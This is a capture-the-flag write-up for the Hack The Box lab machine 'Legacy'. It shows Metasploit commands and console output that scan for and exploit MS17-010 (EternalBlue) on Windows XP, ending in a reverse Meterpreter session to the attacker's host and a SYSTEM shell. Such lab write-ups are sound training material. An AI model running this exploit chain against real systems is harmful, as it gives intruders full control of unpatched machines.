# Legacy

URL: https://app.hackthebox.com/machines/Legacy

Level: Easy

Date 26 May 2020

## Walkthrough

- [Enumeration](#enumeration)

# Enumeration

## NMAP

We found SAMBA service.

We found that we can try Eternal Blue:

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1
```
We then use `ms17_010_psexec`:

```
msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
msf5 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
```

We run it:

```
msf5 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.33:4444
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81f621b8
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... ISnirvJD.exe
[*] 10.10.10.4:445 - Created \ISnirvJD.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \ISnirvJD.exe...
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
[*] Meterpreter session 1 opened (10.10.14.33:4444 -> 10.10.10.4:1031) at 2020-06-09 23:43:13 +0200



meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

And we get SYSTEM shell:

```
meterpreter > shell
Process 1248 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```


